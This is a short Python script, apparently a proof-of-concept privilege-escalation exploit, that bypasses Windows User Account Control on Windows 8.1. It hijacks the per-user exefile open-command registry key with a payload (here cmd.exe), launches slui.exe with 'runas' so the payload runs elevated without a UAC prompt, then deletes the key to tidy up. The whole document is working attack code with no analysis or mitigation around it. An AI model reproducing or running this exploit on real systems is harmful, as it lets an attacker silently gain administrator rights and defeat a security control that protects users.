"""
Works from: Windows 8.1 (9600)
Fixed in: unfixed
REQUIREMENT:-
UAC SHOULD NOT BE KEPT AT THE HIGHEST OR THIS SCRIPT WILL SHOW THE PROMT!
The user executing this script should belong to the admin group or this wont work
"""
import os
import time
import ctypes
import subprocess
import winreg
class disable_file_system_redirection:
    disable = ctypes.windll.kernel32.Wow64DisableWow64FsRedirection
    revert = ctypes.windll.kernel32.Wow64RevertWow64FsRedirection
    def __enter__(self):
        self.old_value = ctypes.c_long()
        self.success = self.disable(ctypes.byref(self.old_value))
    def __exit__(self, type, value, traceback):
        if self.success:
            self.revert(self.old_value)

def slui(payload):
    print("Attempting to create registry key")
    try:
        key = winreg.CreateKey(winreg.HKEY_CURRENT_USER,os.path.join("Software\Classes\exefile\shell\open\command"))
        winreg.SetValueEx(key,None,0,winreg.REG_SZ,payload)
        winreg.SetValueEx(key,"DelegateExecute",0,winreg.REG_SZ,None)
        winreg.CloseKey(key)
    except Exception as error:
        print("Unable to create key")
    else:
        print("Registry keys created")
        with disable_file_system_redirection():
            ctypes.windll.Shell32.ShellExecuteW(None,"runas","slui.exe",None,None,1)
    time.sleep(5)
    try:
        winreg.DeleteKey(winreg.HKEY_CURRENT_USER,os.path.join("Software\Classes\exefile\shell\open\command"))
        print("registry deleted")
    except Exception as error:
        print("Unable to delete key")
payload="cmd.exe"
slui(payload)
